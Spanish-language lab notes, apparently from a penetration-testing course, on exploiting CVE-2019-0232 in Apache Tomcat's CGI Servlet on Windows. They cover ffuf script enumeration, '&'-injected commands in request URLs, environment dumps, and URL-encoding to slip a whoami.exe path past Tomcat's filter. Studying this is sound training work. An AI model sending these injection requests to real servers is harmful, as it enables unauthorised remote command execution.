
## 1. Vulnerabilidad CVE-2019-0232

**CVE-2019-0232** es una vulnerabilidad de inyección de comandos que puede permitir la ejecución remota de código (RCE) en sistemas Windows que ejecutan Apache Tomcat con la opción `enableCmdLineArguments` habilitada.

El problema está en la validación de los argumentos que el Servlet CGI recibe desde la URL y pasa a los scripts externos.

### Versiones afectadas

- Tomcat 9.0.0.M1 hasta 9.0.17.
    
- Tomcat 8.5.0 hasta 8.5.39.
    
- Tomcat 7.0.0 hasta 7.0.93.
    

**Requisito importante:** el objetivo debe cumplir las condiciones de configuración vulnerables, incluida la habilitación de `enableCmdLineArguments` en Windows.

### ¿Cómo funciona?

El Servlet CGI permite ejecutar scripts externos, como archivos `.bat` y `.cmd`.

En Windows, el carácter `&` permite separar comandos. Si la entrada de una petición HTTP llega al script sin una validación adecuada, puede ser posible inyectar comandos adicionales.

Ejemplo utilizado en el material:

```
http://example.com/cgi-bin/hello.bat?&dir
```

El comando `dir` se ejecutaría en el sistema objetivo si se cumplen las condiciones de vulnerabilidad.

## 3. Encontrar scripts CGI con ffuf

El siguiente paso consiste en buscar scripts CGI accesibles desde el servidor web.

El material utiliza el directorio `/cgi` y la wordlist:

```
/usr/share/dirb/wordlists/common.txt
```

### Buscar archivos `.cmd`

```
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

En el laboratorio no se encontraron resultados válidos con esta extensión.

### Buscar archivos `.bat`

```
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

**Resultado encontrado:**

```
FUZZ: welcome
Status: 200
```

Se descubre el script:

```
http://10.129.204.227:8080/cgi/welcome.bat
```

Al acceder a él, devuelve el mensaje:

```
Bienvenido a CGI, esta sección aún no es funcional.
Por favor, regresa a la página de inicio.
```

Aunque el script parezca no tener funcionalidad, puede ser relevante para comprobar la vulnerabilidad.

## 4. Comprobar la ejecución de comandos

El material muestra que añadir `&dir` a la URL devuelve el contenido del directorio:

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

Sin embargo, al intentar ejecutar otros comandos, como `whoami`, no se obtiene una salida visible.

Para investigar el entorno, el material propone consultar las variables de entorno mediante `set`:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Entre los resultados aparecen las siguientes variables:

```
COMSPEC=C:\Windows\system32\cmd.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
SystemRoot=C:\Windows
SERVER_SOFTWARE=TOMCAT
SERVER_PORT=8080
SCRIPT_NAME=/cgi/welcome.bat
```

También se obtiene la ruta del script:

```
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

### Importancia de la variable PATH

En la salida del laboratorio no aparece una variable `PATH` establecida.

Esto significa que no podemos dar por hecho que el sistema encontrará los ejecutables utilizando sus nombres habituales. El material prueba a especificar la ruta completa del ejecutable.

## 5. Codificación URL

Al intentar especificar una ruta de Windows directamente en la URL, Tomcat devuelve un error por un carácter no válido.

Ejemplo mostrado en el material:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

El filtro de Tomcat intenta impedir el uso de ciertos caracteres especiales. El material indica que la codificación URL permite sortear ese filtro.

Caracteres codificados en el ejemplo:

|Carácter|Codificación URL|
|---|---|
|`:`|`%3A`|
|`\`|`%5C`|

La petición codificada que aparece en el material es:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

El texto proporcionado no muestra la salida posterior de esta última petición, por lo que no podemos confirmar su resultado únicamente a partir de esta sección.

## 6. Checklist para el laboratorio

1. Escanear todos los puertos con Nmap.
    
2. Identificar la versión de Tomcat y comprobar si está dentro del rango afectado.
    
3. Buscar scripts `.cmd` y `.bat` en `/cgi` con ffuf.
    
4. Identificar el script `welcome.bat`.
    
5. Comprobar si es posible ejecutar comandos mediante parámetros de la URL.
    
6. Consultar las variables de entorno con `set`.
    
7. Revisar la ruta del script, `COMSPEC`, `SystemRoot` y la disponibilidad de `PATH`.
    
8. Tener en cuenta los filtros de caracteres de Tomcat y la codificación URL.
    

**Puntos clave:** CVE-2019-0232 afecta a determinadas versiones de Tomcat en Windows bajo condiciones específicas. Encontrar una versión potencialmente vulnerable no demuestra por sí solo que el sistema sea explotable; también importa la configuración del Servlet CGI.
